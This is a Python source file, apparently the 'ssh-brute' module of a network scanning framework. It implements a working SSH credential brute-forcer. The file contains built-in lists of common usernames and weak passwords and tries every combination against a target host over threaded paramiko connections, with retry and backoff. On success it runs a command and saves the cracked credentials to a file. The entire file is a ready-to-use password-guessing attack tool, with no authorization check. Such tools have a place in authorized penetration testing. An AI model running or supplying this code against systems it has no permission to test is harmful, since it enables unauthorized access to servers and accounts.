# Light-Scan Framework - Network Security Scanning Framework
# Copyright (C) 2026 Adam Boulaaz
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License along
# with this program; if not, write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.

"""
Light-Scan Scripting Engine (LSSE)
Script Name : ssh-brute
Author : Adam Boulaaz
Arguments
--> Required Arguments
----> --starget
----> -sp
--> Optional Arguments
----> --username
----> --userlist
----> --password
----> --passwordlist
Category:   medium/discovery/ssh
"""

import paramiko
import time
import socket
import random
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock, Event
from datetime import datetime
import os


class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    RESET = '\033[0m'

class SSHErrorCategory:
    BANNER_ERROR = "banner_error"
    AUTH_FAIL = "auth_fail"
    CONNECTION_REFUSED = "connection_refused"
    TIMEOUT = "timeout"
    RESET = "connection_reset"
    NETWORK_UNREACHABLE = "network_unreachable"
    HOST_KEY_ERROR = "host_key_error"
    PROTOCOL_ERROR = "protocol_error"
    RATE_LIMITED = "rate_limited"
    UNKNOWN = "unknown"


def categorize_ssh_error(exception):
    error_str = str(exception).lower()

    if isinstance(exception, paramiko.AuthenticationException):
        return SSHErrorCategory.AUTH_FAIL

    if isinstance(exception, paramiko.SSHException):
        if "banner" in error_str:
            return SSHErrorCategory.BANNER_ERROR
        if "host key" in error_str:
            return SSHErrorCategory.HOST_KEY_ERROR
        if "protocol" in error_str:
            return SSHErrorCategory.PROTOCOL_ERROR
        return SSHErrorCategory.PROTOCOL_ERROR

    if isinstance(exception, socket.error):
        if "connection refused" in error_str:
            return SSHErrorCategory.CONNECTION_REFUSED
        if "timed out" in error_str or "timeout" in error_str:
            return SSHErrorCategory.TIMEOUT
        if "reset" in error_str or "10054" in error_str:
            return SSHErrorCategory.RESET
        if "network is unreachable" in error_str:
            return SSHErrorCategory.NETWORK_UNREACHABLE
        return SSHErrorCategory.NETWORK_UNREACHABLE

    return SSHErrorCategory.UNKNOWN


DEFAULT_USERNAMES = [
    'root', 'admin', 'user', 'ubuntu', 'test', 'guest',
    'pi', 'debian', 'centos', 'oracle', 'postgres',
    'mysql', 'ftp', 'ftpuser', 'webmaster', 'administrator',
    'backup', 'service', 'system', 'developer', 'admin1',
    'itadmin', 'network', 'support', 'operator', 'manager'
]

DEFAULT_PASSWORDS = [
    'root', 'admin', 'password', '123456', '12345678', '1234',
    'qwerty', 'abc123', 'password123', 'admin123', 'letmein',
    'welcome', 'monkey', 'dragon', 'master', 'sunshine',
    'princess', 'iloveyou', 'trustno1', 'shadow', 'killer',
    '12345', '654321', '1q2w3e4r', 'qwertyuiop', 'zaq12wsx',
    '', 'toor', 'P@ssw0rd', 'Passw0rd', 'Abc123!', 'Temp@2024',
    'Welcome1', 'Admin!23', 'Secure@123', 'ChangeMe', '!@#$%^&*'
]

_attempts_lock = Lock()
_success_lock = Lock()
_result_lock = Lock()
_results = []
_total_attempts = 0
_successful_attempts = 0
_error_counts = {}
_stop_event = Event()


class SSHConnectionPool:

    def __init__(self, max_connections=10):
        self.pool = {}
        self.max_connections = max_connections
        self.lock = Lock()
        self.connection_count = 0

    def get_connection(self, target, port, timeout=5):
        key = f"{target}:{port}"

        with self.lock:
            if key in self.pool:
                ssh = self.pool[key]
                if self._is_healthy(ssh):
                    return ssh
                else:
                    del self.pool[key]
                    self.connection_count -= 1

            if self.connection_count < self.max_connections:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                self.pool[key] = ssh
                self.connection_count += 1
                return ssh

            return None

    def _is_healthy(self, ssh):
        try:
            transport = ssh.get_transport()
            if transport is None or not transport.is_active():
                return False
            return True
        except:
            return False

    def close_all(self):
        with self.lock:
            for ssh in self.pool.values():
                try:
                    ssh.close()
                except:
                    pass
            self.pool.clear()
            self.connection_count = 0


def _load_wordlist(filename):
    if not os.path.exists(filename):
        return []

    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            words = [line.strip() for line in f if line.strip()]
        return words
    except Exception as e:
        print(f"{Colors.RED}Error loading {filename}: {e}{Colors.RESET}")
        return []


def _should_retry(error_category, attempt):
    if error_category in [
        SSHErrorCategory.AUTH_FAIL,
        SSHErrorCategory.CONNECTION_REFUSED,
        SSHErrorCategory.HOST_KEY_ERROR
    ]:
        return False

    return attempt < 3


def _get_backoff_delay(attempt):
    base_delay = 0.5
    max_delay = 10
    delay = base_delay * (2 ** attempt)
    return min(delay, max_delay) + random.uniform(0, 0.5)


def _ssh_connect_single(target, port, username, password, timeout):
    global _total_attempts, _successful_attempts, _error_counts

    with _attempts_lock:
        _total_attempts += 1

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(
            hostname=target,
            port=port,
            username=username,
            password=password,
            timeout=timeout,
            banner_timeout=timeout,
            allow_agent=False,
            look_for_keys=False,
            compress=False,
            gss_auth=False,
            gss_kex=False
        )

        with _success_lock:
            _successful_attempts += 1

        with _result_lock:
            _results.append({
                'username': username,
                'password': password,
                'timestamp': datetime.now().isoformat()
            })

        hostname = 'Unknown'
        try:
            stdin, stdout, stderr = ssh.exec_command('hostname', timeout=3)
            hostname = stdout.read().decode().strip() or hostname
        except:
            pass

        ssh.close()
        return True, f"{Colors.GREEN} SUCCESS: {username}:{password} (Host: {hostname}){Colors.RESET}", None

    except paramiko.AuthenticationException:
        ssh.close()
        category = SSHErrorCategory.AUTH_FAIL
        with _attempts_lock:
            _error_counts[category] = _error_counts.get(category, 0) + 1
        return False, f"{Colors.RED} AUTH FAIL: {username}:{password}{Colors.RESET}", category

    except paramiko.SSHException as e:
        ssh.close()
        category = categorize_ssh_error(e)
        with _attempts_lock:
            _error_counts[category] = _error_counts.get(category, 0) + 1

        error_messages = {
            SSHErrorCategory.BANNER_ERROR: f"{Colors.YELLOW}  BANNER ERROR: {username}:{password}{Colors.RESET}",
            SSHErrorCategory.HOST_KEY_ERROR: f"{Colors.YELLOW}  HOST KEY ERROR: {username}:{password}{Colors.RESET}",
            SSHErrorCategory.PROTOCOL_ERROR: f"{Colors.YELLOW}  PROTOCOL ERROR: {username}:{password}{Colors.RESET}",
        }
        msg = error_messages.get(category, f"{Colors.YELLOW}  SSH ERROR: {username}:{password}{Colors.RESET}")
        return False, msg, category

    except socket.error as e:
        ssh.close()
        category = categorize_ssh_error(e)
        with _attempts_lock:
            _error_counts[category] = _error_counts.get(category, 0) + 1

        error_messages = {
            SSHErrorCategory.CONNECTION_REFUSED: f"{Colors.YELLOW}  CONNECTION REFUSED: Port {port} closed{Colors.RESET}",
            SSHErrorCategory.TIMEOUT: f"{Colors.YELLOW}  TIMEOUT: {username}:{password}{Colors.RESET}",
            SSHErrorCategory.RESET: f"{Colors.YELLOW}  CONNECTION RESET: {username}:{password}{Colors.RESET}",
            SSHErrorCategory.NETWORK_UNREACHABLE: f"{Colors.YELLOW}  NETWORK UNREACHABLE: {username}:{password}{Colors.RESET}",
        }
        msg = error_messages.get(category, f"{Colors.YELLOW}  SOCKET ERROR: {username}:{password}{Colors.RESET}")
        return False, msg, category

    except Exception as e:
        ssh.close()
        category = SSHErrorCategory.UNKNOWN
        with _attempts_lock:
            _error_counts[category] = _error_counts.get(category, 0) + 1
        return False, f"{Colors.YELLOW} UNKNOWN ERROR: {str(e)[:40]}{Colors.RESET}", category


def _ssh_connect_with_retry(target, port, username, password, timeout, max_retries=2):
    for attempt in range(max_retries + 1):
        success, message, category = _ssh_connect_single(
            target, port, username, password, timeout
        )

        if success:
            return True, message

        if not _should_retry(category, attempt):
            return False, message

        if _stop_event.is_set():
            return False, f"{Colors.DIM} Stopped by user{Colors.RESET}"

        if attempt < max_retries:
            delay = _get_backoff_delay(attempt)
            time.sleep(delay)

    return False, f"{Colors.DIM} RETRY EXHAUSTED: {username}:{password}{Colors.RESET}"


def _worker(target, port, username, password, delay, timeout, max_retries):
    if delay > 0:
        time.sleep(delay)

    success, message = _ssh_connect_with_retry(
        target, port, username, password, timeout, max_retries
    )

    return success, message, username, password



def ssh_bruteforce(target, port=22, username=None, userlist=None,
                   password=None, passlist=None, delay=0.1,
                   workers=10, timeout=5, max_retries=2,
                   quiet=False, output_file='ssh_hits.txt',
                   connection_pool_size=10):

    global _total_attempts, _successful_attempts, _results, _error_counts
    global _stop_event

    _total_attempts = 0
    _successful_attempts = 0
    _results = []
    _error_counts = {}
    _stop_event.clear()

    usernames = []
    passwords = []

    if username:
        usernames = [username]
    elif userlist:
        usernames = _load_wordlist(userlist)

    if password:
        passwords = [password]
    elif passlist:
        passwords = _load_wordlist(passlist)

    if not usernames:
        usernames = DEFAULT_USERNAMES.copy()
    if not passwords:
        passwords = DEFAULT_PASSWORDS.copy()

    usernames = list(dict.fromkeys(usernames))
    passwords = list(dict.fromkeys(passwords))

    if not usernames or not passwords:
        return {
            'success': False,
            'found': [],
            'attempts': 0,
            'successful': 0,
            'errors': {},
            'time': 0,
            'error': 'No credentials available'
        }

    creds = [(u, p) for u in usernames for p in passwords]
    total_combos = len(creds)

    print(f"\n{Colors.CYAN}{'=' * 60}{Colors.RESET}")
    print(f"{Colors.BOLD}SSH Brute-Force{Colors.RESET}")
    print(f"  Target: {target}:{port}")
    print(f"  Usernames: {len(usernames)}")
    print(f"  Passwords: {len(passwords)}")
    print(f"  Total Combos: {total_combos}")
    print(f"  Threads: {workers}")
    print(f"  Delay: {delay}s")
    print(f"  Timeout: {timeout}s")
    print(f"  Max Retries: {max_retries}")
    print(f"  Connection Pool: {connection_pool_size}")
    print(f"{Colors.CYAN}{'=' * 60}{Colors.RESET}")

    print(f"{Colors.DIM}Validating target...{Colors.RESET}", end=' ')

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        result = sock.connect_ex((target, port))
        sock.close()
        if result != 0:
            print(f"{Colors.RED}FAILED - Connection refused{Colors.RESET}")
            return {
                'success': False,
                'found': [],
                'attempts': 0,
                'successful': 0,
                'errors': {'connection_refused': 1},
                'time': 0,
                'error': 'Target unreachable'
            }
        else:
            print(f"{Colors.GREEN}OK{Colors.RESET}")
    except Exception as e:
        sock.close()
        print(f"{Colors.RED}FAILED - {str(e)[:40]}{Colors.RESET}")
        return {
            'success': False,
            'found': [],
            'attempts': 0,
            'successful': 0,
            'errors': {'validation_error': 1},
            'time': 0,
            'error': str(e)
        }
    pool = SSHConnectionPool(max_connections=connection_pool_size)

    try:
        completed = 0
        success_count = 0
        start_time = time.time()

        with ThreadPoolExecutor(max_workers=workers) as executor:
            futures = {}
            for username, password in creds:
                if _stop_event.is_set():
                    break
                future = executor.submit(
                    _worker,
                    target, port, username, password, delay, timeout, max_retries
                )
                futures[future] = (username, password)

            for future in as_completed(futures):
                if _stop_event.is_set():
                    break

                success, message, username, password = future.result()
                completed += 1

                if success:
                    success_count += 1
                    if not quiet:
                        print(message)

                    try:
                        with open(output_file, 'a') as f:
                            f.write(f"{datetime.now().isoformat()} - {target}:{port} - {username}:{password}\n")
                    except:
                        pass

                if not quiet and (completed % 50 == 0 or completed == total_combos):
                    elapsed = time.time() - start_time
                    rate = completed / elapsed if elapsed > 0 else 0
                    progress_pct = (completed / total_combos) * 100
                    errors_total = sum(_error_counts.values())
                    print(f"{Colors.CYAN}Progress: {completed}/{total_combos} ({progress_pct:.1f}%) | "
                          f"Speed: {rate:.1f}/sec | Found: {success_count} | Errors: {errors_total}{Colors.RESET}")

    except KeyboardInterrupt:
        _stop_event.set()
        print(f"\n{Colors.YELLOW} Interrupted by user{Colors.RESET}")

    finally:
        pool.close_all()

    elapsed = time.time() - start_time

    print(f"\n{Colors.CYAN}{'=' * 60}{Colors.RESET}")
    print(f"{Colors.BOLD}SUMMARY{Colors.RESET}")
    print(f"  Total attempts: {_total_attempts}")
    print(f"  Successful: {_successful_attempts}")
    print(f"  Time: {elapsed:.1f}s")
    print(f"  Speed: {_total_attempts / elapsed:.1f}/sec")

    if _error_counts:
        print(f"\n  {Colors.YELLOW}Error Breakdown:{Colors.RESET}")
        for category, count in sorted(_error_counts.items(), key=lambda x: -x[1]):
            print(f"    {category}: {count}")

    if _results:
        print(f"\n  {Colors.GREEN}Results saved to: {output_file}{Colors.RESET}")
    print(f"{Colors.CYAN}{'=' * 60}{Colors.RESET}")

    return {
        'success': True,
        'found': _results,
        'attempts': _total_attempts,
        'successful': _successful_attempts,
        'errors': _error_counts,
        'time': elapsed
    }

def lsse_ssh_bruteforce(target, port=22, username=None, userlist=None,
                        password=None, passlist=None, delay=0.1,
                        workers=10, timeout=5, max_retries=2, quiet=False):
    result = ssh_bruteforce(
        target=target,
        port=port,
        username=username,
        userlist=userlist,
        password=password,
        passlist=passlist,
        delay=delay,
        workers=workers,
        timeout=timeout,
        max_retries=max_retries,
        quiet=quiet
    )

    if result['found']:
        print(f"\n{Colors.GREEN} Found {len(result['found'])} credentials:{Colors.RESET}")
        for cred in result['found']:
            print(f"  {cred['username']}:{cred['password']}")

